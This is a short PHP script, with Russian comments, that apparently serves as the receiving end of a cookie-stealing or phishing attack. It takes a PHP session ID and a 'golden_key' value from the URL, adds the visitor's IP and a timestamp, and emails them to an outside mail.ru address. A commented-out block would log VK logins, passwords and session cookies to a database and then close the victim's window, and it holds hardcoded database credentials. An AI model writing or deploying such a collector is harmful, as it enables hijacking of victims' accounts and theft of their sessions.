<?php
//Проверяем на наличие данных
//if(isset($_GET['login']) or isset($_GET['pass']) or isset($_GET['remixsid'])){
	
	$ip = $_SERVER['REMOTE_ADDR'];
	$date = date("j.n.Y H:i:s");
	$phps = $_GET['phps'];
	$key = $_GET['key'];
	
	//Подключаем DB
	/*$db = new mysqli('mysql.zzz.com.ua','leoltd2','11212003LeoLeo','leoltd');
	$db->query('SET NAMES "utf8"');
	
	//Вписываем данные в DB
	if($stmt=$db->prepare('insert into vklogin (ip,date,login,pass,remixsid) values (?,?,?,?,?)')){
		$stmt->bind_param('sssss',$ip,$date,$login,$pass,$remixsid);
		$stmt->execute();
		//Проверяем на выполнение
		if($stmt->affected_rows>=1){
			//Закрываем окно
			echo '<script>window.close();</script>';
		}else{
			//Пишем фиг знает чё
			echo 'Error 404';
		}
	}*/
	
	//Пишем письмо о получении данных
	$to = 'tsaruk-2015@mail.ru';
	$subject = 'AutoUP Email - New Information!';
	$message = "Ip: ".$ip."\nDate: ".$date."\nPHPSESSION: ".$phps."\ngolden_key: ".$key;
	$headers = 'From: new@leotechn.zzz.com.ua' . "\r\n";
	mail($to, $subject, $message, $headers);
	
//}else{
//	echo '<script>window.close();</script>';
//}
?>